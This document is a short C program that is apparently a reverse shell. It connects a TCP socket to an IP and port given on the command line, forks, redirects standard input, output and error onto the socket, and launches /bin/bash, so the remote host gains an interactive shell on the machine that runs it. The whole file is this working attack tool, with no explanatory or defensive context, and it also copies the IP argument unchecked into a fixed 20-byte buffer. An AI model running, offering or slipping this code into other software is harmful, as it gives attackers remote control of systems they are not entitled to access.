#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

//IP, then port

int main(int argc, char *argv[]){ 
	//if(argc != 3) {
	//	printf("Usage: ./a.out [IP] [PORT\n");
	//	exit(0);
	//}
	int socket_info, pid, connection, port = atoi(argv[2]);
	struct sockaddr_in info;
	char ip[20];
	strcpy(ip, argv[1]);
	socket_info = socket(AF_INET, SOCK_STREAM, 0);
	info.sin_family = AF_INET;
	info.sin_port = htons(port);
	info.sin_addr.s_addr = inet_addr(ip);
	connection = connect(socket_info, (struct sockaddr *)&info, sizeof(struct sockaddr));	
	if((pid = fork()) < 0)
		printf("Fork Failed\n");
	else if(pid > 0)
		wait(NULL);
	else{
		dup2(socket_info,0);
		dup2(socket_info,1);
		dup2(socket_info,2);
		execlp("/bin/bash", "/bin/bash", NULL);
	}
}
